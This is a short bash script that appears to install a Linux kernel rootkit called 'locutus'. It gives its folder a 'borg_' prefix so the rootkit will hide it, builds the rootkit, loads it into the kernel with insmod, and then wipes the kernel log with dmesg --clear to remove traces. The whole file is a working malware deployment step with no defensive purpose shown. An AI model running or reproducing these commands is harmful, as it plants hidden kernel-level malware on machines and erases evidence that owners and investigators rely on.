#!/bin/bash
mv $(pwd) ../borg_d3monized # add magic prefix to our folder to be hidden

cd locutus
sudo apt install build-essential -y # prepare for building
bash make.sh # build rk
mv locutus borg_locutus # add magic prefix
insmod borg_locutus # insert lkm
dmesg --clear # clear log
